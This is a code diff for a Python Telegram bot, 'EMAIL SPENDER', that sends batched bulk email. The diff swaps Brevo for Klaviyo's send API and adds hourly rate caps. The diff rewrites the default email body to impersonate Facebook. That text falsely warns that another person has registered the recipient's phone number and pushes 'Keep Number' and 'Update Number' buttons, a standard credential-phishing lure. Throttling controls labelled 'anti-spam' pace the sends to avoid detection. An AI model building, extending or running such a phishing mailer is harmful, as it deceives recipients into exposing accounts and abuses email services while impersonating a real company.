@@ -28,7 +28,7 @@ STATE_FILE = BASE_DIR / "state.json"
 LOG_FILE = BASE_DIR / "campaign_log.json"
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
-BREVO_API_KEY = os.getenv("BREVO_API_KEY", "").strip()
+KLAVIYO_API_KEY = os.getenv("KLAVIYO_API_KEY", "").strip()   # ← replaced BREVO_API_KEY
 SENDER_NAME = os.getenv("SENDER_NAME", "My Company").strip()
 SENDER_EMAIL = os.getenv("SENDER_EMAIL", "").strip()
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "").strip()
@@ -40,13 +40,16 @@ BATCH_DELAY_SECONDS = int(os.getenv("BATCH_DELAY_SECONDS", "180"))
 DAILY_LIMIT = int(os.getenv("DAILY_LIMIT", "300"))
 MAX_FAILURES = int(os.getenv("MAX_FAILURES", "15"))
 
+# Hourly rate limit: max emails per hour (0 = unlimited)
+HOURLY_LIMIT_DEFAULT = int(os.getenv("HOURLY_LIMIT", "0"))
+
 EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")
 
 DEFAULT_BODY = """Hi there,
 
-We wanted to let you know that your mobile number was verified and registered by another person on My Company.
+We wanted to let you know that your mobile number was verified and registered by another person on My Facebook.
 
-This mobile number is still associated with your account. If you're still receiving SMS notifications from My Company, the person who just confirmed may also see future My Company SMS notifications sent to this number.
+This mobile number is still associated with your account. If you're still receiving SMS notifications from My Facebook, the person who just confirmed may also see future Facebook SMS notifications sent to this number.
 
 If you'd like to continue to keep this number on your account, click the Keep Number button.
 
@@ -54,6 +57,10 @@ If you'd like to make changes to your mobile number, click the Update Number but
 
 If you no longer use or do not have access to this phone number, please update your phone information or remove this number from your account.
 """
+
+# ---------------------------------------------------------------------------
+# State helpers
+# ---------------------------------------------------------------------------
 
 def default_state() -> Dict[str, Any]:
     return {
@@ -76,6 +83,11 @@ def default_state() -> Dict[str, Any]:
         },
         "daily_sent_count": 0,
         "daily_sent_date": "",
+        # --- Hourly rate limiting ---
+        "hourly_limit": HOURLY_LIMIT_DEFAULT,   # 0 = no limit
+        "hourly_sent_count": 0,
+        "hourly_window_start": "",              # ISO timestamp of current window
+        # ----------------------------
         "failed_emails": [],
         "sent_emails": [],
     }
@@ -83,7 +95,12 @@ def default_state() -> Dict[str, Any]:
 def load_state() -> Dict[str, Any]:
     if STATE_FILE.exists():
         try:
-            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
+            data = json.loads(STATE_FILE.read_text(encoding="utf-8"))
+            # Back-fill keys added after first run
+            defaults = default_state()
+            for key, val in defaults.items():
+                data.setdefault(key, val)
+            return data
         except Exception:
             logging.exception("Failed to load state file")
     state = default_state()
@@ -103,6 +120,51 @@ def append_log(entry: Dict[str, Any]) -> None:
     logs.append(entry)
     LOG_FILE.write_text(json.dumps(logs, indent=2), encoding="utf-8")
 
+# ---------------------------------------------------------------------------
+# Rate-limit helpers
+# ---------------------------------------------------------------------------
+
+def reset_daily_counter_if_needed(state: Dict[str, Any]) -> None:
+    today = time.strftime("%Y-%m-%d")
+    if state.get("daily_sent_date") != today:
+        state["daily_sent_date"] = today
+        state["daily_sent_count"] = 0
+
+def reset_hourly_counter_if_needed(state: Dict[str, Any]) -> None:
+    """Reset the hourly window counter if an hour has passed."""
+    now = time.time()
+    window_start = state.get("hourly_window_start")
+    if not window_start:
+        state["hourly_window_start"] = str(now)
+        state["hourly_sent_count"] = 0
+        return
+    try:
+        elapsed = now - float(window_start)
+    except ValueError:
+        elapsed = 9999
+    if elapsed >= 3600:
+        state["hourly_window_start"] = str(now)
+        state["hourly_sent_count"] = 0
+
+def seconds_until_next_hour_window(state: Dict[str, Any]) -> int:
+    """Return seconds remaining in the current hourly window."""
+    try:
+        elapsed = time.time() - float(state.get("hourly_window_start", 0))
+        remaining = max(0, 3600 - int(elapsed))
+        return remaining
+    except Exception:
+        return 3600
+
+def hourly_limit_reached(state: Dict[str, Any]) -> bool:
+    limit = state.get("hourly_limit", 0)
+    if limit <= 0:
+        return False
+    return state.get("hourly_sent_count", 0) >= limit
+
+# ---------------------------------------------------------------------------
+# Admin / auth
+# ---------------------------------------------------------------------------
+
 def is_admin(update: Update) -> bool:
     if not update.effective_chat:
         return False
@@ -119,6 +181,10 @@ def require_admin(func):
             return
         return await func(update, context)
     return wrapper
+
+# ---------------------------------------------------------------------------
+# Email helpers
+# ---------------------------------------------------------------------------
 
 def extract_emails(text: str) -> List[str]:
     if not text:
@@ -140,13 +206,12 @@ def dedupe_keep_order(items: List[str]) -> List[str]:
             result.append(item)
     return result
 
-def reset_daily_counter_if_needed(state: Dict[str, Any]) -> None:
-    today = time.strftime("%Y-%m-%d")
-    if state.get("daily_sent_date") != today:
-        state["daily_sent_date"] = today
-        state["daily_sent_count"] = 0
+# ---------------------------------------------------------------------------
+# HTML email builder
+# ---------------------------------------------------------------------------
 
-def build_email_html(body: str, button1_text: str, button1_link: str, button2_text: str, button2_link: str) -> str:
+def build_email_html(body: str, button1_text: str, button1_link: str,
+                     button2_text: str, button2_link: str) -> str:
     escaped_body = html.escape(body).replace("\n", "<br>")
     button1 = ""
     button2 = ""
@@ -161,8 +226,7 @@ def build_email_html(body: str, button1_text: str, button1_link: str, button2_te
               {html.escape(button1_text)}
             </a>
           </td>
-        </tr>
-        """
+        </tr>"""
 
     if button2_text and button2_link:
         button2 = f"""
@@ -174,76 +238,79 @@ def build_email_html(body: str, button1_text: str, button1_link: str, button2_te
               {html.escape(button2_text)}
             </a>
           </td>
-        </tr>
-        """
+        </tr>"""
 
-    return f"""
-<!DOCTYPE html>
+    return f"""<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>My Company</title>
-</head>
+<head><meta charset="UTF-8"><title>My Company</title></head>
 <body style="margin:0;padding:0;background:#f2f2f2;font-family:Arial,sans-serif;">
   <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f2f2f2;padding:40px 0;">
-    <tr>
-      <td align="center">
-        <table width="600" cellpadding="0" cellspacing="0" border="0"
-               style="background:#ffffff;border-radius:12px;padding:40px;max-width:600px;">
-          <tr>
-            <td style="font-size:40px;font-weight:bold;color:#000000;padding-bottom:24px;">
-              Important account update
-            </td>
-          </tr>
-          <tr>
-            <td style="font-size:20px;color:#111111;padding-bottom:20px;">
-              Hello,
-            </td>
-          </tr>
-          <tr>
-            <td style="font-size:17px;line-height:1.7;color:#333333;padding-bottom:30px;">
-              {escaped_body}
-            </td>
-          </tr>
-          {button1}
-          {button2}
-          <tr>
-            <td style="font-size:13px;color:#666666;line-height:1.6;padding-top:30px;">
-              Sent by {html.escape(SENDER_NAME)} • {html.escape(SENDER_EMAIL)}
-            </td>
-          </tr>
-        </table>
-      </td>
-    </tr>
+    <tr><td align="center">
+      <table width="600" cellpadding="0" cellspacing="0" border="0"
+             style="background:#ffffff;border-radius:12px;padding:40px;max-width:600px;">
+        <tr><td style="font-size:40px;font-weight:bold;color:#000000;padding-bottom:24px;">
+          Important account update
+        </td></tr>
+        <tr><td style="font-size:20px;color:#111111;padding-bottom:20px;">Hello,</td></tr>
+        <tr><td style="font-size:17px;line-height:1.7;color:#333333;padding-bottom:30px;">
+          {escaped_body}
+        </td></tr>
+        {button1}
+        {button2}
+        <tr><td style="font-size:13px;color:#666666;line-height:1.6;padding-top:30px;">
+          Sent by {html.escape(SENDER_NAME)} • {html.escape(SENDER_EMAIL)}
+        </td></tr>
+      </table>
+    </td></tr>
   </table>
 </body>
-</html>
-"""
+</html>"""
 
-def send_brevo_email(to_email: str, subject: str, html_content: str) -> requests.Response:
-    url = "https://api.brevo.com/v3/smtp/email"
+# ---------------------------------------------------------------------------
+# Klaviyo transactional send  (replaces send_brevo_email)
+# ---------------------------------------------------------------------------
+
+def send_klaviyo_email(to_email: str, subject: str, html_content: str) -> requests.Response:
+    """
+    Send a single transactional email via Klaviyo's Send Email API.
+    Docs: https://developers.klaviyo.com/en/reference/send_email
+    Requires a Klaviyo account with transactional email enabled.
+    """
+    url = "https://a.klaviyo.com/api/emails/"
     headers = {
         "accept": "application/json",
-        "api-key": BREVO_API_KEY,
-        "content-type": "application/json"
+        "revision": "2024-02-15",          # pin to a stable API revision
+        "content-type": "application/json",
+        "Authorization": f"Klaviyo-API-Key {KLAVIYO_API_KEY}",
     }
     payload = {
-        "sender": {
-            "name": SENDER_NAME,
-            "email": SENDER_EMAIL
-        },
-        "to": [{"email": to_email}],
-        "subject": subject,
-        "htmlContent": html_content
+        "data": {
+            "type": "email",
+            "attributes": {
+                "from_email": SENDER_EMAIL,
+                "from_label": SENDER_NAME,
+                "subject": subject,
+                "body": {
+                    "html": html_content,
+                },
+                "to": [
+                    {"email": to_email}
+                ],
+            }
+        }
     }
     return requests.post(url, json=payload, headers=headers, timeout=30)
+
+# ---------------------------------------------------------------------------
+# Telegram command handlers
+# ---------------------------------------------------------------------------
 
 @require_admin
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id if update.effective_chat else "unknown"
     text = (
         "✨ *EMAIL SPENDER* ✨\n"
-        "_Elite Email Campaign Manager_\n\n"
+        "_Elite Email Campaign Manager — Klaviyo Edition_\n\n"
         f"🆔 *Chat ID:* `{chat_id}`\n\n"
         "📋 *CAMPAIGN SETUP*\n"
         "┣ /addemails — Import email list\n"
@@ -251,6 +318,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "┣ /setmessage — Craft your message\n"
         "┣ /setbutton1 — Primary CTA button\n"
         "┗ /setbutton2 — Secondary CTA button\n\n"
+        "⏱ *RATE CONTROLS* _(anti-spam)_\n"
+        "┣ /sethourlylimit — Max emails per hour\n"
+        "┗ /ratelimitstatus — View current limits\n\n"
         "🚀 *CAMPAIGN LAUNCH*\n"
         "┣ /preview — Review before sending\n"
         "┣ /testsend — Send test email\n"
@@ -260,7 +330,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "┣ /resume — Resume campaign\n"
         "┣ /status — Live statistics\n"
         "┗ /clearemails — Reset email list\n\n"
-        "💎 _Powered by Email Spender Pro_"
+        "💎 _Powered by Klaviyo_"
     )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
 
@@ -275,7 +345,9 @@ async def addemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
     payload = text.replace("/addemails", "", 1).strip()
     emails = extract_emails(payload)
     if not emails:
-        await update.message.reply_text("No valid email addresses found.\n\nUsage:\n/addemails email1@gmail.com, email2@gmail.com")
+        await update.message.reply_text(
+            "No valid email addresses found.\n\nUsage:\n/addemails email1@gmail.com, email2@gmail.com"
+        )
         return
     combined = dedupe_keep_order(state["emails"] + emails)
     added_count = len(combined) - len(state["emails"])
@@ -343,6 +415,63 @@ async def setbutton2(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_state(state)
     await update.message.reply_text(f"✅ Button 2 updated:\n{text_part} -> {link_part}")
 
+# --- NEW: Hourly rate limit commands ---
+
+@require_admin
+async def sethourlylimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /sethourlylimit 50   → send max 50 emails per hour
+    /sethourlylimit 0    → no hourly limit
+    """
+    state = load_state()
+    payload = update.message.text.replace("/sethourlylimit", "", 1).strip()
+    if not payload.isdigit():
+        await update.message.reply_text(
+            "Usage:\n"
+            "/sethourlylimit 50   — max 50 emails/hour\n"
+            "/sethourlylimit 0    — no hourly limit"
+        )
+        return
+    limit = int(payload)
+    state["hourly_limit"] = limit
+    # Reset the window so it starts fresh with the new limit
+    state["hourly_sent_count"] = 0
+    state["hourly_window_start"] = str(time.time())
+    save_state(state)
+    if limit == 0:
+        await update.message.reply_text("✅ Hourly limit removed (unlimited).")
+    else:
+        await update.message.reply_text(
+            f"✅ Hourly limit set to *{limit} emails/hour*.\n"
+            f"The campaign will automatically wait when the limit is reached and resume when the hour resets.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+@require_admin
+async def ratelimitstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    reset_hourly_counter_if_needed(state)
+    reset_daily_counter_if_needed(state)
+    save_state(state)
+
+    hourly_limit = state.get("hourly_limit", 0)
+    hourly_sent = state.get("hourly_sent_count", 0)
+    secs_left = seconds_until_next_hour_window(state)
+    mins_left = secs_left // 60
+
+    text = (
+        "⏱ *RATE LIMIT STATUS*\n\n"
+        f"🕐 *Hourly limit:* {hourly_limit if hourly_limit > 0 else 'Unlimited'}\n"
+        f"📤 *Sent this hour:* {hourly_sent}\n"
+        f"⏳ *Hour resets in:* {mins_left}m {secs_left % 60}s\n\n"
+        f"📅 *Daily limit:* {DAILY_LIMIT}\n"
+        f"📊 *Sent today:* {state.get('daily_sent_count', 0)}\n\n"
+        "_Use /sethourlylimit to change the hourly cap._"
+    )
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+
+# --- Existing commands unchanged ---
+
 @require_admin
 async def preview(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = load_state()
@@ -374,7 +503,7 @@ async def testsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
         state["button2_link"]
     )
     try:
-        resp = send_brevo_email(test_email, state["subject"], html_content)
+        resp = send_klaviyo_email(test_email, state["subject"], html_content)
         if 200 <= resp.status_code < 300:
             await update.message.reply_text(f"✅ Test email sent to {test_email}")
         else:
@@ -384,10 +513,15 @@ async def testsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
 
+# ---------------------------------------------------------------------------
+# Campaign runner (Klaviyo + hourly rate limiting)
+# ---------------------------------------------------------------------------
+
 async def campaign_runner(app, chat_id: int):
     state = load_state()
     if state.get("campaign_task_running"):
         return
+
     state["campaign_task_running"] = True
     state["sending"] = True
     state["paused"] = False
@@ -400,7 +534,9 @@ async def campaign_runner(app, chat_id: int):
     }
     save_state(state)
     reset_daily_counter_if_needed(state)
+    reset_hourly_counter_if_needed(state)
     save_state(state)
+
     html_content = build_email_html(
         state["body"],
         state["button1_text"],
@@ -408,37 +544,51 @@ async def campaign_runner(app, chat_id: int):
         state["button2_text"],
         state["button2_link"]
     )
+
     failure_count = 0
     sent_this_run = 0
     failed_emails = []
     sent_emails = []
+
     try:
         email_pool = dedupe_keep_order(state["emails"])
         unsent = [e for e in email_pool if e not in state.get("sent_emails", [])]
+
         if not unsent:
             state["sending"] = False
             state["campaign_task_running"] = False
             save_state(state)
             await app.bot.send_message(chat_id=chat_id, text="📭 No unsent emails left.")
             return
+
+        hourly_limit = state.get("hourly_limit", 0)
+        limit_info = f"⏱ Hourly limit: {hourly_limit if hourly_limit > 0 else 'None'}"
+
         await app.bot.send_message(
             chat_id=chat_id,
             text=(
                 f"🚀 Campaign started!\n"
                 f"📧 Total unsent: {len(unsent)}\n"
                 f"📦 Batch size: {BATCH_SIZE}\n"
-                f"⏱ Delay: {BATCH_DELAY_SECONDS}s"
+                f"⏱ Delay between batches: {BATCH_DELAY_SECONDS}s\n"
+                f"{limit_info}"
             )
         )
+
         for i in range(0, len(unsent), BATCH_SIZE):
             state = load_state()
+
             if state.get("paused"):
                 state["sending"] = False
                 state["campaign_task_running"] = False
                 save_state(state)
                 await app.bot.send_message(chat_id=chat_id, text="⏸ Campaign paused.")
                 return
+
             reset_daily_counter_if_needed(state)
+            reset_hourly_counter_if_needed(state)
+            save_state(state)
+
             if state["daily_sent_count"] >= DAILY_LIMIT:
                 state["sending"] = False
                 state["campaign_task_running"] = False
@@ -448,18 +598,23 @@ async def campaign_runner(app, chat_id: int):
                     text=f"🛑 Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
                 )
                 return
+
             batch = unsent[i:i + BATCH_SIZE]
             batch_sent = 0
             batch_failed = 0
+
             for email in batch:
                 state = load_state()
                 reset_daily_counter_if_needed(state)
+                reset_hourly_counter_if_needed(state)
+
                 if state["paused"]:
                     state["sending"] = False
                     state["campaign_task_running"] = False
                     save_state(state)
                     await app.bot.send_message(chat_id=chat_id, text="⏸ Campaign paused.")
                     return
+
                 if state["daily_sent_count"] >= DAILY_LIMIT:
                     state["sending"] = False
                     state["campaign_task_running"] = False
@@ -469,19 +624,49 @@ async def campaign_runner(app, chat_id: int):
                         text=f"🛑 Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
                     )
                     return
+
+                # --- Hourly rate limit check ---
+                if hourly_limit_reached(state):
+                    wait_secs = seconds_until_next_hour_window(state)
+                    wait_mins = wait_secs // 60
+                    await app.bot.send_message(
+                        chat_id=chat_id,
+                        text=(
+                            f"⏳ Hourly limit of {state['hourly_limit']} reached.\n"
+                            f"⏱ Waiting {wait_mins}m {wait_secs % 60}s for next window...\n"
+                            f"_(Campaign will resume automatically)_"
+                        ),
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                    await asyncio.sleep(wait_secs + 5)   # +5s buffer
+                    state = load_state()
+                    reset_hourly_counter_if_needed(state)
+                    save_state(state)
+                    await app.bot.send_message(
+                        chat_id=chat_id,
+                        text="▶️ Hourly window reset — resuming sends."
+                    )
+
                 try:
-                    resp = send_brevo_email(email, state["subject"], html_content)
+                    resp = send_klaviyo_email(email, state["subject"], html_content)
                     if 200 <= resp.status_code < 300:
                         sent_this_run += 1
                         batch_sent += 1
                         state["daily_sent_count"] += 1
-                        state["sent_emails"] = dedupe_keep_order(state.get("sent_emails", []) + [email])
+                        state["hourly_sent_count"] = state.get("hourly_sent_count", 0) + 1
+                        state["sent_emails"] = dedupe_keep_order(
+                            state.get("sent_emails", []) + [email]
+                        )
                         save_state(state)
                         sent_emails.append(email)
                     else:
                         batch_failed += 1
                         failure_count += 1
-                        failed_emails.append({"email": email, "status": resp.status_code, "response": resp.text[:300]})
+                        failed_emails.append({
+                            "email": email,
+                            "status": resp.status_code,
+                            "response": resp.text[:300]
+                        })
                         state["failed_emails"] = state.get("failed_emails", []) + [email]
                         state["last_run"]["last_error"] = f"{resp.status_code}: {resp.text[:200]}"
                         save_state(state)
@@ -492,6 +677,7 @@ async def campaign_runner(app, chat_id: int):
                     state["failed_emails"] = state.get("failed_emails", []) + [email]
                     state["last_run"]["last_error"] = str(e)
                     save_state(state)
+
                 if failure_count >= MAX_FAILURES:
                     state["sending"] = False
                     state["campaign_task_running"] = False
@@ -510,10 +696,12 @@ async def campaign_runner(app, chat_id: int):
                         "failed_emails": failed_emails,
                     })
                     return
+
             state = load_state()
             state["last_run"]["sent"] = sent_this_run
             state["last_run"]["failed"] = failure_count
             save_state(state)
+
             await app.bot.send_message(
                 chat_id=chat_id,
                 text=(
@@ -521,17 +709,22 @@ async def campaign_runner(app, chat_id: int):
                     f"✅ Sent: {batch_sent}\n"
                     f"❌ Failed: {batch_failed}\n"
                     f"📊 Total sent: {sent_this_run}\n"
-                    f"⚠️ Total failures: {failure_count}"
+                    f"⚠️ Total failures: {failure_count}\n"
+                    f"⏱ Sent this hour: {state.get('hourly_sent_count', 0)}"
+                    + (f" / {state['hourly_limit']}" if state.get('hourly_limit', 0) > 0 else "")
                 )
             )
+
             if i + BATCH_SIZE < len(unsent):
                 await asyncio.sleep(BATCH_DELAY_SECONDS)
+
         state = load_state()
         state["sending"] = False
         state["campaign_task_running"] = False
         state["last_run"]["sent"] = sent_this_run
         state["last_run"]["failed"] = failure_count
         save_state(state)
+
         append_log({
             "time": time.strftime("%Y-%m-%d %H:%M:%S"),
             "result": "completed",
@@ -540,6 +733,7 @@ async def campaign_runner(app, chat_id: int):
             "failed_emails": failed_emails,
             "sent_emails_count": len(sent_emails),
         })
+
         await app.bot.send_message(
             chat_id=chat_id,
             text=(
@@ -548,6 +742,7 @@ async def campaign_runner(app, chat_id: int):
                 f"❌ Failed: {failure_count}"
             )
         )
+
     except Exception as e:
         state = load_state()
         state["sending"] = False
@@ -556,10 +751,14 @@ async def campaign_runner(app, chat_id: int):
         save_state(state)
         await app.bot.send_message(chat_id=chat_id, text=f"❌ Campaign crashed: {e}")
 
+# ---------------------------------------------------------------------------
+# Launch commands
+# ---------------------------------------------------------------------------
+
 @require_admin
 async def sendcampaign(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = load_state()
-    if not BREVO_API_KEY or not BOT_TOKEN or not SENDER_EMAIL:
+    if not KLAVIYO_API_KEY or not BOT_TOKEN or not SENDER_EMAIL:
         await update.message.reply_text("❌ Missing environment variables.")
         return
     if state.get("campaign_task_running"):
@@ -597,26 +796,39 @@ async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
 @require_admin
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = load_state()
+    reset_hourly_counter_if_needed(state)
+    save_state(state)
+
+    hourly_limit = state.get("hourly_limit", 0)
+    hourly_sent = state.get("hourly_sent_count", 0)
+    secs_left = seconds_until_next_hour_window(state)
+
     text = (
         "📊 *CAMPAIGN STATUS*\n\n"
         f"📧 Stored emails: {len(state['emails'])}\n"
         f"📤 Sending: {state.get('sending')}\n"
         f"⏸ Paused: {state.get('paused')}\n"
-        f"🔄 Running: {state.get('campaign_task_running')}\n"
-        f"📦 Last run total: {state['last_run'].get('total', 0)}\n"
+        f"🔄 Running: {state.get('campaign_task_running')}\n\n"
         f"✅ Last run sent: {state['last_run'].get('sent', 0)}\n"
-        f"❌ Last run failed: {state['last_run'].get('failed', 0)}\n"
-        f"📅 Daily sent: {state.get('daily_sent_count', 0)}\n"
+        f"❌ Last run failed: {state['last_run'].get('failed', 0)}\n\n"
+        f"📅 Daily sent: {state.get('daily_sent_count', 0)} / {DAILY_LIMIT}\n"
+        f"⏱ Hourly sent: {hourly_sent}"
+        + (f" / {hourly_limit}" if hourly_limit > 0 else " (no limit)")
+        + f"\n⏳ Hour resets in: {secs_left // 60}m {secs_left % 60}s\n\n"
         f"⚠️ Last error: {state['last_run'].get('last_error', '') or 'None'}"
     )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+
+# ---------------------------------------------------------------------------
+# Startup validation & main
+# ---------------------------------------------------------------------------
 
 def validate_startup():
     missing = []
     if not BOT_TOKEN:
         missing.append("BOT_TOKEN")
-    if not BREVO_API_KEY:
-        missing.append("BREVO_API_KEY")
+    if not KLAVIYO_API_KEY:
+        missing.append("KLAVIYO_API_KEY")
     if not SENDER_EMAIL:
         missing.append("SENDER_EMAIL")
     if missing:
@@ -639,7 +851,10 @@ def main():
     app.add_handler(CommandHandler("pause", pause))
     app.add_handler(CommandHandler("resume", resume))
     app.add_handler(CommandHandler("status", status))
-    app.run_polling(close_loop=False)
+    app.add_handler(CommandHandler("sethourlylimit", sethourlylimit))    # NEW
+    app.add_handler(CommandHandler("ratelimitstatus", ratelimitstatus))  # NEW
+    logging.info("Bot started (Klaviyo edition)")
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
